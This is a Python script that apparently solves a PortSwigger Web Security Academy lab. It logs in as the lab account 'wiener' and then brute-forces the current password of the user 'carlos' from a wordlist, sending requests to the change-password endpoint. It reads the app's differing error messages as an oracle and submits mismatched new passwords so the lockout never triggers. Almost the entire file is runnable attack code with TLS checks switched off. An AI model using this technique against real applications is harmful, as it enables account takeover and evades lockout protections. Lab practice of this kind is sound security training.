import requests
import urllib3
import re
import time
from rich.console import Console

console = Console()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def login(session, login_url, my_username, my_password):
    """Log in as YOUR OWN account to get a valid session cookie."""
    payload = {"username": my_username, "password": my_password}

    resp = session.post(login_url, data=payload, verify=False, allow_redirects=True)
    if "/my-account" not in resp.url and "Log out" not in resp.text:
        console.print("[red]Login failed — check your own credentials.[/red]")
        return False
    console.print("[green]Logged in successfully.[/green]")
    return True


def brute_force_target_password(session, change_url, target_username, wordlist):
    """
    While authenticated as our own user, brute-force TARGET_USERNAME's
    CURRENT password via the change-password endpoint.

    Oracle (per lab description):
      - correct current-password + mismatched new passwords -> "New passwords do not match"  <- SUCCESS SIGNAL
      - wrong current-password  + mismatched new passwords -> "Current password is incorrect"
      - wrong current-password  + MATCHING new passwords    -> account gets locked (avoid this!)
    """
    for current_password in wordlist:
        payload = {
            "username": target_username,          # the account we're attacking
            "current-password": current_password,  # our guess
            "new-password-1": "111",                # deliberately MISMATCHED
            "new-password-2": "222",                # to avoid triggering a lockout
        }

        try:
            resp = session.post(change_url, data=payload, verify=False, allow_redirects=True)
        except requests.RequestException as e:
            console.print(f"[red]Request failed: {e}[/red]")
            continue

        # --- DEBUG: see exactly what came back ---
        error_match = re.search(
            r'<p class="[^"]*is-warning[^"]*">(.*?)</p>', resp.text, re.DOTALL
        )
        page_msg = error_match.group(1).strip() if error_match else "(no warning banner found)"
        console.print(f"[cyan]status={resp.status_code} final_url={resp.url}[/cyan]  [magenta]{page_msg}[/magenta]")
        # --- END DEBUG ---

        if "New passwords do not match" in resp.text:
            # current-password WAS correct — the app only checks whether the
            # new passwords match *after* validating current-password.
            console.print(f"[green]Success! {target_username}'s current password is: {current_password}[/green]")
            return current_password
        elif "Current password is incorrect" in resp.text:
            console.print(f"[red]Failed: {current_password}[/red]")
        elif "locked" in resp.text.lower() or "too many" in resp.text.lower():
            console.print("[yellow]Account appears locked — stopping to avoid further lockout.[/yellow]")
            return None
        else:
            console.print(f"[yellow]Unrecognized response for: {current_password} — check debug output above[/yellow]")

    console.print("[yellow]Brute force completed. No valid password found.[/yellow]")
    return None


def main():
    base = "https://0ad7008004cf355d80db1253006100e4.web-security-academy.net"
    login_url = f"{base}/login"
    change_url = f"{base}/my-account/change-password"

    my_username, my_password = "wiener", "peter"   # correct default lab credentials
    target_username = "carlos"                     # the account being attacked
    wordlist_path = "passwords.txt"

    try:
        with open(wordlist_path, "r") as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[red]Wordlist file not found: {wordlist_path}[/red]")
        return

    session = requests.Session()
    if not login(session, login_url, my_username, my_password):
        return

    brute_force_target_password(session, change_url, target_username, wordlist)


if __name__ == "__main__":
    main()